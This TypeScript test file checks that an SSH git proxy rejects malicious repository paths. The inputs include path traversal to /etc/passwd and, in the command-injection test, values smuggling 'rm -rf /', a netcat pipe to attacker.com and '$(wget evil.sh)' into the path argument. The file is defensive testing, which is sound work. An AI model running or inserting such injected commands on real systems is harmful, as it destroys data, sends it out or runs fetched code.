/**
 * Security tests for SSH implementation
 * Tests validation functions and security boundaries
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll, vi } from 'vitest';
import { SSHServer } from '../../src/proxy/ssh/server';
import { ClientWithUser } from '../../src/proxy/ssh/types';
import * as fs from 'fs';
import * as config from '../../src/config';
import { execSync } from 'child_process';

describe('SSH Security Tests', () => {
  const testKeysDir = 'test/keys';

  beforeAll(() => {
    // Create directory for test keys if needed
    if (!fs.existsSync(testKeysDir)) {
      fs.mkdirSync(testKeysDir, { recursive: true });
    }

    // Generate test SSH key in PEM format if it doesn't exist
    if (!fs.existsSync(`${testKeysDir}/test_key`)) {
      try {
        execSync(
          `ssh-keygen -t rsa -b 2048 -m PEM -f ${testKeysDir}/test_key -N "" -C "test@git-proxy"`,
          { timeout: 5000, stdio: 'pipe' },
        );
        console.log('[Test Setup] Generated test SSH key in PEM format');
      } catch (error) {
        console.error('[Test Setup] Failed to generate test key:', error);
        throw error; // Fail setup if we can't generate keys
      }
    }

    // Mock SSH config to use test keys
    vi.spyOn(config, 'getSSHConfig').mockReturnValue({
      enabled: true,
      port: 2222,
      hostKey: {
        privateKeyPath: `${testKeysDir}/test_key`,
        publicKeyPath: `${testKeysDir}/test_key.pub`,
      },
    } as any);
  });

  afterAll(() => {
    vi.restoreAllMocks();
  });
  describe('Repository Path Validation', () => {
    let server: SSHServer;

    beforeEach(() => {
      server = new SSHServer();
    });

    afterEach(() => {
      server.stop();
    });

    it('should reject repository paths with path traversal sequences (..)', async () => {
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const mockStream = {
        stderr: {
          write: (msg: string) => {
            expect(msg).toContain('path traversal');
          },
        },
        exit: (code: number) => {
          expect(code).toBe(1);
        },
        end: () => {},
      } as any;

      // Try command with path traversal
      const maliciousCommand = "git-upload-pack 'github.com/../../../etc/passwd.git'";

      await server.handleCommand(maliciousCommand, mockStream, client);
    });

    it('should reject repository paths without .git extension', async () => {
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const mockStream = {
        stderr: {
          write: (msg: string) => {
            expect(msg).toContain('must end with .git');
          },
        },
        exit: (code: number) => {
          expect(code).toBe(1);
        },
        end: () => {},
      } as any;

      const invalidCommand = "git-upload-pack 'github.com/test/repo'";
      await server.handleCommand(invalidCommand, mockStream, client);
    });

    it('should reject repository paths with special characters', async () => {
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const mockStream = {
        stderr: {
          write: (msg: string) => {
            expect(msg).toContain('Invalid repository path');
          },
        },
        exit: (code: number) => {
          expect(code).toBe(1);
        },
        end: () => {},
      } as any;

      const maliciousCommand = "git-upload-pack 'github.com/test/repo;whoami.git'";
      await server.handleCommand(maliciousCommand, mockStream, client);
    });

    it('should reject repository paths with double slashes', async () => {
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const mockStream = {
        stderr: {
          write: (msg: string) => {
            expect(msg).toContain('path traversal');
          },
        },
        exit: (code: number) => {
          expect(code).toBe(1);
        },
        end: () => {},
      } as any;

      const invalidCommand = "git-upload-pack 'github.com//test//repo.git'";
      await server.handleCommand(invalidCommand, mockStream, client);
    });

    it('should reject repository paths with invalid hostname', async () => {
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const mockStream = {
        stderr: {
          write: (msg: string) => {
            expect(msg).toContain('Invalid hostname');
          },
        },
        exit: (code: number) => {
          expect(code).toBe(1);
        },
        end: () => {},
      } as any;

      const invalidCommand = "git-upload-pack 'invalid_host$/test/repo.git'";
      await server.handleCommand(invalidCommand, mockStream, client);
    });
  });

  describe('Pack Data Chunk Limits', () => {
    it('should enforce maximum chunk count limit', async () => {
      // This test verifies the MAX_PACK_DATA_CHUNKS limit
      // In practice, the server would reject after 10,000 chunks

      const server = new SSHServer();
      const MAX_CHUNKS = 10000;

      // Simulate the chunk counting logic
      const chunks: Buffer[] = [];

      // Try to add more than max chunks
      for (let i = 0; i < MAX_CHUNKS + 100; i++) {
        chunks.push(Buffer.from('data'));

        if (chunks.length >= MAX_CHUNKS) {
          // Should trigger error
          expect(chunks.length).toBe(MAX_CHUNKS);
          break;
        }
      }

      expect(chunks.length).toBe(MAX_CHUNKS);
      server.stop();
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection via repository path', async () => {
      const server = new SSHServer();
      const client: ClientWithUser = {
        authenticatedUser: {
          username: 'test-user',
          email: 'test@example.com',
        },
        agentForwardingEnabled: true,
        clientIp: '127.0.0.1',
      } as ClientWithUser;

      const injectionAttempts = [
        "git-upload-pack 'github.com/test/repo.git; rm -rf /'",
        "git-upload-pack 'github.com/test/repo.git && whoami'",
        "git-upload-pack 'github.com/test/repo.git | nc attacker.com 1234'",
        "git-upload-pack 'github.com/test/repo.git`id`'",
        "git-upload-pack 'github.com/test/repo.git$(wget evil.sh)'",
      ];

      for (const maliciousCommand of injectionAttempts) {
        let errorCaught = false;

        const mockStream = {
          stderr: {
            write: (msg: string) => {
              errorCaught = true;
              expect(msg).toContain('Invalid');
            },
          },
          exit: (code: number) => {
            expect(code).toBe(1);
          },
          end: () => {},
        } as any;

        await server.handleCommand(maliciousCommand, mockStream, client);
        expect(errorCaught).toBe(true);
      }

      server.stop();
    });
  });
});
